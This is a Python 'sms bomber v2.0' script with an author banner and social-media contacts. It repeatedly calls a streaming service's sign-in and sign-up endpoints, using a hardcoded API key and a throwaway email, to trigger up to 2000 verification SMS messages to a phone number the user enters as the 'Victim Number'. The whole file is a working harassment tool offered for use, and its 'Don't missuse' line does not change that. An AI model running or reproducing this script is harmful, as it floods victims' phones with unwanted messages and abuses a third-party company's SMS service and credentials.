#!/usr/bin/env python3

print(f"###############  ##########")
print(f"###############  ########## ")
print(f"      ###        ##")
print(f"      ###        ##   ")
print(f"      ###        ##########")
print(f"      ###        ##########")
print(f"      ###                ## ")
print(f"      ###                ##")
print(f"      ###       ###########")
print(f"      ###       ###########")
print(f" ")
print(f" ")
print(f"Don't missuse this tool")
print(f"sms bomber v2.0")
print("")
print(f"Author:./Helix ")
print("")
print(f"Contact FB:https://www.facebook.com/05thStaR/ ")
print("")
print("website:fb.com/05thStaR")
print("")
print("")
print("Git Hub:https://github.com/sulovens")
print("_______________________________________________")
print(f"you can only perform on one numberin a day ")
import requests as baba

"""
SMS Bomber using Hoichoi SMS api
"""

def send(target):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+62"+target,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  res = baba.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+62"+target,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = baba.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
  target = input("\n\n\n\n\033[1;93m[*] Victim Number: ")
  amount = int(input("\033[1;96m[*] Threat (Max 2000) : "))
  sent, nsent = 0, amount
  for i in range(1, amount + 1):
    try:
      if send(target):
        print(f"[ID: {i}] SMS Sent!")
        sent += 1
        nsent -= 1
      else:
        print(f"[ID: {i}] SMS Not Sent...")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total Threat : {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")

if __name__ == "__main__":
  main()
